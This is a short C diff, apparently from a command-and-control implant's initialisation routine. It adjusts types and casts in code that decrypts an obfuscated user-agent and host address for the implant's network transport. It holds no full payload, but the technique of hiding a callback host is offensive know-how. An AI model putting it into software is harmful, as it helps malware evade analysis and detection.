@@ -19,18 +19,18 @@ VOID RvntInit() {
     // UserAgent and Host IP always obfuscated
     UCHAR s_xk[] = S_XK;
     UCHAR e_UserAgent[] = CONFIG_USER_AGENT;
-    CHAR e_Host[] = CONFIG_HOST;
+    UCHAR e_Host[] = CONFIG_HOST;
 
     UCHAR d_UserAgent[sizeof(e_UserAgent)] = {0};
-    CHAR d_Host[sizeof(e_Host)] = {0};
+    UCHAR d_Host[sizeof(e_Host)] = {0};
 
-    ROL_AND_DECRYPT((char *)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, s_xk);
-    ROL_AND_DECRYPT((char *)e_Host, sizeof(e_Host), 1, d_Host, s_xk);
+    ROL_AND_DECRYPT((PUCHAR)e_UserAgent, sizeof(e_UserAgent), 1, d_UserAgent, (PCCH) s_xk);
+    ROL_AND_DECRYPT((PUCHAR)e_Host, sizeof(e_Host), 1, d_Host, (PCCH) s_xk);
 
     PWCHAR w_UserAgent = NULL;
     PWCHAR w_Host = NULL;
 
-    w_UserAgent = str_to_wide( d_UserAgent);
+    w_UserAgent = str_to_wide( (PCCH) d_UserAgent);
     w_Host = str_to_wide(d_Host);
 
     Instance.Config.Transport.UserAgent = w_UserAgent;
